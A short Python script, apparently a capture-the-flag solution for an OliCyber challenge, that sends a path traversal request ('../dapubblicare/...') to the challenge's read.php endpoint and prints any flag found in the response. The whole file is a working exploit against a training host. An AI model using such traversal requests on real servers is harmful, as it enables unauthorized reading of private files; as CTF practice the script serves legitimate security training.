import requests

# path traversal
url = 'http://trova-le-soluzioni-2.challs.olicyber.it/read.php?file=../dapubblicare/20240310.txt'
r = requests.get(url).text

for i in r.split():
    if "flag{" in i.lower():
        print(i)